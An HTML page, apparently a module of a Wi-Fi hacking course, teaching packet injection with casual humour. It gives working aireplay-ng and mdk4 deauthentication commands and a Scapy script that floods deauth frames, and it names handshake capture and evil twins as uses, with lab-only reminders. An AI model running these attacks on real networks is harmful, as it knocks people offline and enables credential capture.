@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Wi-Fi Hacking Course - Module 9: Packet Injection & Fun with Frames</title>
+  <link rel="stylesheet" href="universal.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background: #0f1117;
+      color: #eaeaea;
+      line-height: 1.7;
+    }
+    header {
+      background: #1f222e;
+      padding: 20px 40px;
+      text-align: center;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.3);
+    }
+    header h1 {
+      margin: 0;
+      font-size: 2rem;
+      color: #38bdf8;
+    }
+    .container {
+      max-width: 900px;
+      margin: auto;
+      padding: 40px 20px;
+    }
+    h2 {
+      color: #fbbf24;
+      margin-top: 40px;
+    }
+    code, pre {
+      background: #1e1e2e;
+      color: #a6e3a1;
+      padding: 10px;
+      display: block;
+      border-radius: 8px;
+      overflow-x: auto;
+    }
+    .highlight {
+      background: #38bdf8;
+      color: #0f1117;
+      font-weight: bold;
+      padding: 2px 6px;
+      border-radius: 4px;
+    }
+    .note {
+      background: #f472b6;
+      color: #1f2937;
+      padding: 12px;
+      border-radius: 6px;
+      margin: 20px 0;
+      font-weight: 600;
+    }
+    ul {
+      padding-left: 1.5em;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Module 9: Packet Injection & Fun with Frames</h1>
+  </header>
+  <div class="container">
+    <h2>🎯 Module 9: Packet Injection & Fun with Frames</h2>
+    <p>Welcome to the action zone! In this module, we’re not just listening — we’re <strong>talking back to the network</strong>. This is where we learn <span class="highlight">packet injection</span>, the art of injecting custom frames into Wi-Fi traffic. 🛰️💣</p>
+
+    <h2>📦 What is Packet Injection?</h2>
+    <p>Imagine you’re in a group chat and you suddenly drop a meme that looks like it came from the admin. That’s packet injection — inserting your own data into the network to trick devices or gather info.</p>
+
+    <h2>📊 Real World Example</h2>
+    <p>Bob’s laptop thinks it's still talking to the router. You inject a deauth packet that says, "GTFO." Bob disconnects. You laugh. 😎</p>
+
+    <h2>🔧 Tools of the Trade</h2>
+    <ul>
+      <li><code>aireplay-ng</code> – For deauth attacks, fake auths, replay attacks</li>
+      <li><code>mdk4</code> – A Swiss Army knife for Wi-Fi injection chaos</li>
+      <li><code>Scapy</code> – Python tool to craft custom frames (for nerds)</li>
+    </ul>
+
+    <h2>📶 Injection Test</h2>
+    <p>Before launching attacks, test if your adapter supports injection:</p>
+    <pre><code>aireplay-ng --test wlan0mon</code></pre>
+
+    <h2>💥 Deauthentication Attack</h2>
+    <p>This is the Wi-Fi version of kicking someone out of a room:</p>
+    <pre><code>aireplay-ng --deauth 10 -a &lt;router MAC&gt; -c &lt;client MAC&gt; wlan0mon</code></pre>
+
+    <h2>🧪 Fun Attack with mdk4</h2>
+    <p>Make all Wi-Fi devices in the area cry (use responsibly):</p>
+    <pre><code>mdk4 wlan0mon d</code></pre>
+
+    <div class="note">💡 Note: Always run these attacks in a lab or test environment. Don’t make your neighbor’s Netflix stop buffering.</div>
+
+    <h2>🧠 Real Case Use</h2>
+    <p>You can use packet injection to:</p>
+    <ul>
+      <li>Disconnect clients to capture handshakes</li>
+      <li>Fake a network (evil twin)</li>
+      <li>Trigger reconnections to analyze traffic</li>
+    </ul>
+
+    <h2>🐍 Going Pro with Scapy</h2>
+    <p>If you want to flex your Python skills:</p>
+    <pre><code>from scapy.all import *
+
+packet = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55")/Dot11Deauth()
+sendp(packet, iface="wlan0mon", count=100)</code></pre>
+
+    <h2>🚨 Legal Reminder</h2>
+    <p>Always remember: <strong>Test. Learn. Never harm.</strong> Use your powers ethically and only in authorized environments. 🧑‍🏫</p>
+
+    <h2>📦 Summary</h2>
+    <ul>
+      <li>Packet injection lets you interact with Wi-Fi traffic</li>
+      <li>Common attacks: deauth, fake auth, beacon spam</li>
+      <li>Tools: aireplay-ng, mdk4, Scapy</li>
+    </ul>
+
+    <p>🧨 That’s a wrap on Module 9! Next up, Module 10: <strong>Fake Access Points & Evil Twin Attacks</strong> – where we build haunted Wi-Fi networks. 👻📶</p>
+
+    <div class="navigation-buttons">
+      <a href="module8.html">&laquo; Previous</a>
+      <a href="module10.html">Next &raquo;</a>
+    </div>
+    
+  </div>
+</body>
+</html>
